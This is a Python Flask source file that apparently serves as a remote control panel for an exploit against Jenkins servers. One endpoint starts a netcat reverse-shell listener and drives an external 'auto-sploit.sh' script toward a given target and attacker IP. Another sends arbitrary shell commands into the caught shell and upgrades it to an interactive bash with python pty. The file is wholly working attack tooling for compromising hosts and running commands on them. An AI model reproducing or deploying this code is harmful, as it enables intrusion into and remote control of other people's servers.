

import pexpect
from flask import Flask
from flask import request
import os
import time

app = Flask(__name__)


@app.route("/")
def hello():
    return "Good Day!"


@app.route("/launch", methods=['POST'])
def launch_sploit():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """
    if request.is_json:
        print(request.data)
        payload = request.get_json()
        print(request.mimetype)
        print(request.content_type)
        print(request.accept_mimetypes)
        print(payload)
        print(type(payload))
        target_ip = payload.get('target', '')
        attacker_ip = payload.get('attacker', '')
        if target_ip == "" or attacker_ip == "":
            print('Payload is all wrong!')
            print(request.payload)
            return 'ERROR'

        exe = '/root/auto-sploit.sh'
        if not os.path.exists(exe):
            return 500, 'launch script does not exist'

        print('Launching auto-sploit.sh')
        child = pexpect.spawn('/root/auto-sploit.sh')
        child.delaybeforesend = 2
        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('launching listener process')
            _launch_listener()
            child.send('\n')
        else:
            return 'ERROR - Could not press key to continue'

        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('Sending attacker ip :::' + attacker_ip + ':::')
            child.sendline(attacker_ip)
        else:
            return 'ERROR - Could not enter attacker IP'

        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print(child.before)
            print('Sending target ip {}'.format(target_ip))
            child.sendline(target_ip)
        else:
            print(child.before)
            return 'ERROR - Could not enter jenkins IP'

        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            print('PWN')
            print(child)
            time.sleep(2)
            return 'SUCCESS - auto-sploit launched!'

    else:
        return 'No Bueno - No JSON payload detected'


@app.route("/send", methods=['POST'])
def send_cmd():
    if request.is_json:
        data = request.get_json()
        cli = data.get('cli', '')
        if cli == '':
            return 'No Bueno - Invalid JSON payload'

        if 'listener' in app.config:
            print('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                return 'No Bueno - Listener does not appear to be active'

            print('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            print(found_index)
            if found_index == 0:
                # no prompt yet
                print('Great, trying to get a prompt now')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")

            if found_index > 2:
                print(listener.before)
                return 'Someting is wrong with the listener connection!'

            # listener.sendline(cli)
            # print(listener)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            print('Found index is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                return 'Someting is wrong with the listener connection!'
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            print('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                return 'Someting is wrong with the listener connection!'
            print(listener)
            return listener.before

        else:
            return 'NOPE'
    else:
        return 'NOWAYJOSE'


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        print('Launched and ready to rock')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            return True
        else:
            listener = pexpect.spawn('nc -lvp 443')
            found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
            if found_index != 0:
                return False
            app.config['listener'] = listener
            return True


